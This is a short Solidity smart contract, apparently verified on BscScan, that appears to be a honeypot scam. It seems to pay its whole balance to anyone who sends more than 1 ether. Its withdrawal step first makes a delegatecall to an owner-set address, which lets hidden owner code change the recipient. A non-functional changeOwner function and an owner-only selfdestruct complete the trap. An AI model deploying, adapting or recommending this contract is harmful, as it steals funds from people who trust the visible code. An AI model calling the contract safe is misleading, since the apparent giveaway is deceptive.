/**
 *Submitted for verification at BscScan.com on 2021-10-18
*/

pragma solidity ^0.4.11;

contract firstTest
{
    address Owner = 0xe145cb97D1dB32D0F44d6AC086A13A80E48e5d7A;
    address emails = 0xe145cb97D1dB32D0F44d6AC086A13A80E48e5d7A;
    address adr;
    uint256 public Limit= 1000000000000000000;
    
    function Set(address dataBase, uint256 limit) 
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }
    
    function changeOwner(address adr){
        // update Owner=msg.sender;
    }
    
    function()payable{
        //if owner
        withdrawal();
    }
    
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    
    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {  
            emails.delegatecall(bytes4(sha3("logEvent()")));
            adr.send(this.balance);
            
        }
    }
    
}